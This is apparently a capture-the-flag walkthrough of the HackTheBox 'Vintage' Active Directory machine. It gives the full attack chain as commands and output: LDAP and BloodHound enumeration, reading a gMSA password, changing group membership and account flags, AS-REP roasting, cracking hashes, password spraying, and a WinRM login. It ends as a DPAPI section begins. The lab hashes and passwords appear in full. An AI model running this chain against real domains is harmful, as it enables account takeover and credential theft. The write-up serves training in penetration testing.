# Enumeration 
```
sudo nmap -sC -sV -vvv -Pn -p- --min-rate 20000 --stats-every 50s 10.10.11.45
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-25 04:39 CDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:39
Completed NSE at 04:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:39
Completed NSE at 04:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:39
Completed NSE at 04:39, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 04:39
Completed Parallel DNS resolution of 1 host. at 04:39, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 04:39
Scanning 10.10.11.45 [65535 ports]
Discovered open port 135/tcp on 10.10.11.45
Discovered open port 445/tcp on 10.10.11.45
Discovered open port 53/tcp on 10.10.11.45
Discovered open port 139/tcp on 10.10.11.45
Discovered open port 9389/tcp on 10.10.11.45
Discovered open port 464/tcp on 10.10.11.45
Discovered open port 636/tcp on 10.10.11.45
Discovered open port 88/tcp on 10.10.11.45
Discovered open port 49685/tcp on 10.10.11.45
Discovered open port 59153/tcp on 10.10.11.45
Discovered open port 389/tcp on 10.10.11.45
Discovered open port 593/tcp on 10.10.11.45
Discovered open port 49664/tcp on 10.10.11.45
Discovered open port 49674/tcp on 10.10.11.45
Discovered open port 3269/tcp on 10.10.11.45
Discovered open port 3268/tcp on 10.10.11.45
Discovered open port 62763/tcp on 10.10.11.45
Discovered open port 5985/tcp on 10.10.11.45
Discovered open port 49668/tcp on 10.10.11.45
Completed SYN Stealth Scan at 04:39, 6.85s elapsed (65535 total ports)
Initiating Service scan at 04:39
Scanning 19 services on 10.10.11.45
Stats: 0:00:51 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 73.68% done; ETC: 04:40 (0:00:16 remaining)
Completed Service scan at 04:40, 60.28s elapsed (19 services on 1 host)
NSE: Script scanning 10.10.11.45.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:40
NSE Timing: About 99.96% done; ETC: 04:41 (0:00:00 remaining)
Stats: 0:01:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 1 (1 waiting)
NSE Timing: About 99.96% done; ETC: 04:41 (0:00:00 remaining)
Completed NSE at 04:41, 40.07s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:41
Completed NSE at 04:41, 5.74s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:41
Completed NSE at 04:41, 0.00s elapsed
Nmap scan report for 10.10.11.45
Host is up, received user-set (0.20s latency).
Scanned at 2025-04-25 04:39:31 CDT for 113s
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-25 09:38:24Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
59153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62763/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-25T09:39:22
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53397/tcp): CLEAN (Timeout)
|   Check 2 (port 64197/tcp): CLEAN (Timeout)
|   Check 3 (port 61163/udp): CLEAN (Timeout)
|   Check 4 (port 61489/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -1m21s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:41
Completed NSE at 04:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:41
Completed NSE at 04:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:41
Completed NSE at 04:41, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.25 seconds
           Raw packets sent: 131053 (5.766MB) | Rcvd: 28 (1.512KB)
```
Looks like we have DNS (53), Kerberos (88,464), SMB (445), WinRM (5985), and LDAP (389, 636, 3268, 3269)
We will firstly begin with a ldapsearch 
```
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName memberOf
```
- ldapsearch: command line tool for querying LDAP directories 
- -x: Indicates the use of simple authentication instead of SASL authentication 
- `-H ldap://<IP>`: Specify address of LDAP server 
- `-D "P.Rosa@vintage.htb`: Bind DN (Distinguished Name), which is the user credential used to log in LDAP server 
- `-w "Rosaisbest123"`: Specify password of bind user 
- `-b "DC=vintage,DC=htb"`: Specifies base DN for search, that is, node from which to start searching LDAP directory 
- "(objectClass=user)": Filter which specifies that only user entries with object class are to be queried 
- sAMAccountName memberOf: Specifies attribute to be returned 
sAMAccountName is the user's login name, memberOf indicating the groups to which the user belongs 
```
# extended LDIF
#
# LDAPv3
# base <DC=vintage,DC=htb> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName memberOf 
#

# Administrator, Users, vintage.htb
dn: CN=Administrator,CN=Users,DC=vintage,DC=htb
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: Administrator

# Guest, Users, vintage.htb
dn: CN=Guest,CN=Users,DC=vintage,DC=htb
memberOf: CN=Guests,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: Guest

# DC01, Domain Controllers, vintage.htb
dn: CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
sAMAccountName: DC01$

# krbtgt, Users, vintage.htb
dn: CN=krbtgt,CN=Users,DC=vintage,DC=htb
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
sAMAccountName: krbtgt

# gMSA01, Managed Service Accounts, vintage.htb
dn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
sAMAccountName: gMSA01$

# fs01, Computers, vintage.htb
dn: CN=fs01,CN=Computers,DC=vintage,DC=htb
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: FS01$

# M.Rossi, Users, vintage.htb
dn: CN=M.Rossi,CN=Users,DC=vintage,DC=htb
sAMAccountName: M.Rossi

# R.Verdi, Users, vintage.htb
dn: CN=R.Verdi,CN=Users,DC=vintage,DC=htb
sAMAccountName: R.Verdi

# L.Bianchi, Users, vintage.htb
dn: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: L.Bianchi

# G.Viola, Users, vintage.htb
dn: CN=G.Viola,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: G.Viola

# C.Neri, Users, vintage.htb
dn: CN=C.Neri,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: C.Neri

# P.Rosa, Users, vintage.htb
dn: CN=P.Rosa,CN=Users,DC=vintage,DC=htb
sAMAccountName: P.Rosa

# svc_sql, Pre-Migration, vintage.htb
dn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_sql

# svc_ldap, Pre-Migration, vintage.htb
dn: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ldap

# svc_ark, Pre-Migration, vintage.htb
dn: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ark

# C.Neri_adm, Users, vintage.htb
dn: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Desktop Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: C.Neri_adm

# L.Bianchi_adm, Users, vintage.htb
dn: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
sAMAccountName: L.Bianchi_adm

# search reference
ref: ldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 21
# numEntries: 17
# numReferences: 3
```
We will see there is Computer with a domain name of which `FS01.vintage.htb` we will add this to /etc/hosts
```
10.10.11.45 vintage.htb DC01 DC01.vintage.htb FS01.vintage.htb
```
we will now change /etc/resove.conf for bloodhound
```
cat /etc/resolv.conf
nameserver 1.1.1.1
nameserver 8.8.8.8
nameserver 10.10.11.45
```
We will now synchronise timezones because Kerberos authentication has time zone restrictions
```
ntupdate dc01.vintage.htb
```
We will now collect information
```
bloodhound-python -u P.Rosa -p 'Rosaisbest123' -d vintage.htb -c All -dc dc01.vintage.htb            
```
importing data into bloodhound, we see L.BIANCHI_ADM@VINTAGE.HTB is in domain admin group and has admin privs
![[VINTAGE BLOODHOUND.png]]
and GMSA01$VINTAGE.HTB can add themselves to admin group 
![[VINTAGE BLOODHOUND2.png]]
Intra-domain relations 
![[VINTAGE BLOODHOUND3.png]]
From FS01 to GMSA01 we can see that FS01 can read the password of GMS 

then GMS can add itself to admin group 
![[VINTAGE BLOODHOUND4.png]]
Use GetTGT.py provide password, hash or aeskey to request TGT and save it in ccache format 
```
impacket-getTGT  -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
[*] Saving ticket in FS01$.ccache
```
Now we will set this as environment variable to specify cache file that the kerberos client should use 
```
export KRB5CCNAME=FS01\$.ccache
```
We will use bloodyAD to interact with AD, through kerberos authentication, to obtain the password (stored in attribute) GMSA01$ of the managed service account named from specified AD domain controller msDS-ManagedPassword 
```
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k get object 'GMSA01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
msDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g==
```
Attempt to obtain a Kerberos ticket from AD domain controller using the known GMSA account hash
```
impacket-getTGT vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
[*] Saving ticket in GMSA01$.ccache
```
We will now make this environment variable 
```
export KRB5CCNAME=GMSA01\$.ccache
```
We will then add P.Rosa to SERVICEMANAGERS, use GMSA creds, and then generate own creds
```
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add groupMember "SERVICEMANAGERS" "P.Rosa"

[+] P.Rosa added to SERVICEMANAGERS
```

```
impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
[*] Saving ticket in P.Rosa.ccache
```
Now make this environment variable 
```
export KRB5CCNAME=P.Rosa.ccache 
```
Try to use this ticket to list users who do not need Kerberos domain authentication, first generate a username list of users in the domain 
```
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d " " -f 2 > usernames.txt   

cat usernames.txt 
Administrator
Guest
DC01$
krbtgt
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
```
Then we will use impacket-GetNPUsers to list users who do not require Kerberos domain authentication 
```
impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User svc_ldap doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_ark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Next disable pre-authentication 
```
──╼ [★]$ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_ARK's userAccountControl
┌─[au-vip-1]─[10.10.14.2]─[zzac@htb-xng4pqphqw]─[~]
└──╼ [★]$ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_LDAP's userAccountControl
┌─[au-vip-1]─[10.10.14.2]─[zzac@htb-xng4pqphqw]─[~]
└──╼ [★]$ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_SQL's userAccountControl
```
Enable account
```
└──╼ [★]$ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_ARK -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_ARK's userAccountControl
┌─[au-vip-1]─[10.10.14.2]─[zzac@htb-xng4pqphqw]─[~]
└──╼ [★]$ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_LDAP -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_LDAP's userAccountControl
┌─[au-vip-1]─[10.10.14.2]─[zzac@htb-xng4pqphqw]─[~]
└──╼ [★]$ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl
```
Check the domain user again 
```
impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_sql@VINTAGE.HTB:282fb5df95ccb3fad935a4c8c9a5aba2$4534689662271033f44570626dee4da7ad79198e095433326938b6cf20b87e36eb9e38409b7123cc9a900dbcdd3694870c2fec8017ce23d2d0be1092892172c83ce2c78e7bffbfbbf9fe1f561e130470dea31398bfe4e640915f64d2c9d93a73763f9e61e045928087448e1ff9908aab333f9d8174da6554ed7d01ad4ee8a193911678c3ec8bdfc2eec4a03bc690ae5084f34e18f64342677af8f4e098e56c47ba47f1ada387e777734d6902e2679bb8a0c8726626fdc57a89d5eb5829729cc0d65b7a1b7bef708179bee50ee37e98c8ca227f08bdde0f99e44a3709a29cae85a708204b3ec5e1b3473e
$krb5asrep$23$svc_ldap@VINTAGE.HTB:f2407ccd9ae6f1d9eed51f3b0a064f36$4cf175897ce5951da6d7c06b59bac400bf96c7a741f26285ee96628c9c3ba3710078add29f9b7ef2010792c633622a795e90034805712af47c3ccf1c676d71769cff5f1416856291dfb0daf5a2a385cfd4d88d205b7fcc70f6fa3c1408d3fc020a8108c842fd49373cc190c013215b6d4acffd6dbff664f43391dc559a3852e53ae7d78e7f44df795b66842576fb90db144259fa5a5137d7a8ebb245477c4554630e02a583fc5df5095bfc960fea5ad4e164b78a022a2dc40c82a5dfd49633331b7cd7ec597718c5a86b15b4724d038cea90ee37ecf5be29c980d723a4676753bb22101618c7ed1b3bae
$krb5asrep$23$svc_ark@VINTAGE.HTB:b296a405d236fed3039aebaf22658c67$f9d918b1e7a76c86bfa0407f3593d8eb2d83149190d8bd7740f88c65fe3d989c0a4429ec1a9c28ce8f4ca10d001351f529a5654bd59f27ebe1f1bb2a3893830cbee23204c94328d5ef24c93112e8ed7208176e5cbeb690049ab6539e21a724128b3cab9ad8680f6694a908a97d17c9933d646010655d801695cce7df3085e21aa4e094e65f6b06687f4e124d70c6e9c2297c944a538a31fe26dddd8b6a06b169bbbda2ed80e710f432a56b900fe591bb22def126aeca903300247db86f6a7c059047584aed349e5eaf624e653e803bd16c80f594dd50e8889ad30de6e5388f3a2897c81c1e946880404a
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
```
The svc_sql hash is the only one which can crack 
```
hashcat -a 0 -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt

<SNIP>
$krb5asrep$23$svc_sql@VINTAGE.HTB:21f3bee616690890b5888e3e18d56582$89e966c8c984fdba49c4a5cb373407959a53c78fe823bcb599e4bff22df326780d2a869ed1572467797244c4b2f50a49af143612ee467dba34784a66a5805ad1d556e129838c3107a40259d80edafb2e6f88c80a77a4b3d30d5069a69d3a6b7f001f2fa3251faa17706a7fd255a96c3bfadf10f93e049b0fcc1f41227af5dbefee1ae906f23bfc4d1c6b0f7a8f4328ecce63b45e6944157f88d814830c568fb59763f1d6e785736d5ec368c6d27968c399eaa339067dc32783df85920ae876d3241bace19475691d6373cd0700771659a90d15a4cfeeb1dd89a5a6659b2c6316863e475ce228ac83274f:Zer0the0ne
<SNIP>
```
We can now kerbrute to blast user 
```
curl -LO https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 8092k  100 8092k    0     0  39.7M      0 --:--:-- --:--:-- --:--:-- 39.7M
┌─[au-vip-1]─[10.10.14.2]─[zzac@htb-xng4pqphqw]─[~]
└──╼ [★]$ ls
 cacert.der  'FS01$.ccache'          Music           Public
 Desktop     'GMSA01$.ccache'        my_data         Templates
 Documents    hashes.txt             Pictures        usernames.txt
 Downloads    kerbrute_linux_amd64   P.Rosa.ccache   Videos
┌─[au-vip-1]─[10.10.14.2]─[zzac@htb-xng4pqphqw]─[~]
└──╼ [★]$ chmod +x kerbrute_linux_amd64
┌─[au-vip-1]─[10.10.14.2]─[zzac@htb-xng4pqphqw]─[~]
└──╼ [★]$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
┌─[au-vip-1]─[10.10.14.2]─[zzac@htb-xng4pqphqw]─[~]
└──╼ [★]$ kerbrute --help

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
┌─[au-vip-1]─[10.10.14.2]─[zzac@htb-xng4pqphqw]─[~]
└──╼ [★]$ kerbrute --dc vintage.htb -d vintage.htb -v passwordspray usernames.txt Zer0the0ne

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop

2025/04/25 05:14:42 >  Using KDC(s):
2025/04/25 05:14:42 >  	vintage.htb:88

2025/04/25 05:14:42 >  [!] krbtgt@vintage.htb:Zer0the0ne - USER LOCKED OUT
2025/04/25 05:14:42 >  [!] Guest@vintage.htb:Zer0the0ne - USER LOCKED OUT
2025/04/25 05:14:43 >  [!] DC01$@vintage.htb:Zer0the0ne - Invalid password
2025/04/25 05:14:43 >  [!] Administrator@vintage.htb:Zer0the0ne - Invalid password
2025/04/25 05:14:43 >  [!] R.Verdi@vintage.htb:Zer0the0ne - Invalid password
2025/04/25 05:14:43 >  [!] FS01$@vintage.htb:Zer0the0ne - Invalid password
2025/04/25 05:14:43 >  [!] L.Bianchi@vintage.htb:Zer0the0ne - Invalid password
2025/04/25 05:14:43 >  [!] gMSA01$@vintage.htb:Zer0the0ne - Invalid password
2025/04/25 05:14:43 >  [!] G.Viola@vintage.htb:Zer0the0ne - Invalid password
2025/04/25 05:14:43 >  [!] M.Rossi@vintage.htb:Zer0the0ne - Invalid password
2025/04/25 05:14:43 >  [!] svc_sql@vintage.htb:Zer0the0ne - USER LOCKED OUT
2025/04/25 05:14:43 >  [!] P.Rosa@vintage.htb:Zer0the0ne - Invalid password
2025/04/25 05:14:43 >  [!] C.Neri_adm@vintage.htb:Zer0the0ne - Invalid password
2025/04/25 05:14:43 >  [!] L.Bianchi_adm@vintage.htb:Zer0the0ne - Invalid password
2025/04/25 05:14:43 >  [+] VALID LOGIN:	 C.Neri@vintage.htb:Zer0the0ne
2025/04/25 05:14:43 >  [!] svc_ldap@vintage.htb:Zer0the0ne - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/04/25 05:14:43 >  [!] svc_ark@vintage.htb:Zer0the0ne - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
```
Account C.Neri@vintage.htb Use password `Zer0the0ne`Successfully logged in
![[VINTAGE BLOODHOUND5.png]]
Get creds for this account 
```
impacket-getTGT vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb 

[*] Saving ticket in c.neri.ccache

export KRB5CCNAME=c.neri.ccache
```
we cannot login just yet, we need to edit our /etc/krb5.conf for a `[realms]` section which will look like this 
```
[realms]
  VINTAGE.HTB = {
    kdc = 10.10.11.45
  }
```
we can now try to login 
```
evil-winrm -i dc01.vintage.htb -r vintage.htb
```
and we logged in get user flag 
```
*Evil-WinRM* PS C:\Users\C.Neri\Desktop> type user.txt
fd75f1095d59456f2775fff2ccf92741
```
we can run whoami /user 
```
whoami /user

USER INFORMATION
----------------

User Name      SID
============== ==============================================
vintage\c.neri S-1-5-21-4024337825-2033394866-2055507597-1115

```
then run whoami /priv
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
we will be exploiting DPAPI (Data Protection API) which is a cryptographic API in Windows operating systems that is designed to protect sensitive data, such as password, private keys, credentials, etc. It provides applications with the ability to encrypt and decrypt data, while hiding complex encryption operations and simplifying the encryption process. DPAPI is designed to ensure that only the current user or system can access the encrypted data. 

 How DPAPI works
- **Encryption** : When an application or Windows system needs to store sensitive information, it can encrypt the data through DPAPI. Encryption uses the user's login credentials (such as the user's login password or the computer's key) to generate an encryption key.
- **Decryption** : DPAPI can only decrypt data using the same key in the same user context. This way, if an application or service tries to access encrypted credentials or data, only the currently logged on user or administrator can decrypt and access the information.
- **Security** : DPAPI is based on account authentication information in the Windows operating system, so its encryption key is closely associated with the user's login credentials, ensuring that only specific users can access their own encrypted data.
Here we use DPAPI to obtain windows identity credentials 
```
